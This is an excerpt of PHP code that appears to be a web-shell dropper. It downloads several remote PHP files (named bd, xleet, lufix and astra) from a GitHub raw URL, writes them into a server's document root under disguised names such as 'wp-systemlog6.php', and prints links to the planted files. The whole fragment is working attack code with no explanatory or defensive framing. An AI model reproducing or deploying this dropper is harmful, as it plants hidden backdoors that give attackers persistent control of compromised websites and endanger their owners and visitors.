...
$text1 = http_get('https://raw.githubusercontent.com/erasablenihal/x/main/bd.php');
...
$check2 = $_SERVER['DOCUMENT_ROOT'] . "/wp-systemlog6.php" ;
$text2 = http_get('https://raw.githubusercontent.com/erasablenihal/x/main/xleet.php');
$open2 = fopen($check2, 'w');
fwrite($open2, $text2);
fclose($open2);
if(file_exists($check2)){
}
echo " Stored  xl : <a href=\"http://".$_SERVER['HTTP_HOST']."/wp-systemlog6.php\">".$_SERVER['HTTP_HOST']."/wp-systemlog6.php  </a>\n<br>";


$check3 = $_SERVER['DOCUMENT_ROOT'] . "/wp-systemlog7.php" ;
$text3 = http_get('https://raw.githubusercontent.com/erasablenihal/x/main/lufix.php');
$open3 = fopen($check3, 'w');
fwrite($open3, $text3);
fclose($open3);
if(file_exists($check3)){
}
echo " Stored lu : <a href=\"http://".$_SERVER['HTTP_HOST']."/wp-systemlog7.php\">".$_SERVER['HTTP_HOST']."/wp-systemlog7.php  </a>\n<br>";


$check4 = $_SERVER['DOCUMENT_ROOT'] . "/wp-systemlog8.php" ;
$text4 = http_get('https://raw.githubusercontent.com/erasablenihal/x/main/astra.php');
$open4 = fopen($check4, 'w');
fwrite($open4, $text4);
fclose($open4);
if(file_exists($check4)){
}
echo " Stored as : <a href=\"http://".$_SERVER['HTTP_HOST']."/wp-systemlog8.php\">".$_SERVER['HTTP_HOST']."/wp-systemlog8.php  </a>\n<br>";
